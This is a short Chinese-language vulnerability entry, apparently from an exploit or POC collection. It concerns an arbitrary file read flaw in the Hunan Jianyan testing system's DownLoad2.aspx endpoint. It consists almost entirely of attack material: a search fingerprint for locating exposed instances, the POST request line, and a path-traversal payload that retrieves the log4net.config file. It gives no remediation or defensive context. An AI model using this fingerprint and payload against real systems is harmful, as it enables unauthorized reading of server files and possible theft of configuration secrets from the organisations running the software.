# 湖南建研检测系统存在DownLoad2.aspx任意文件读取漏洞

湖南建研检测系统 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="Login/QRLogin.ashx"`
- **请求**：`POST /Common/DownLoad2.aspx HTTP/1.1`

**Payload**
```
path=..%2Flog4net.config&Name=
```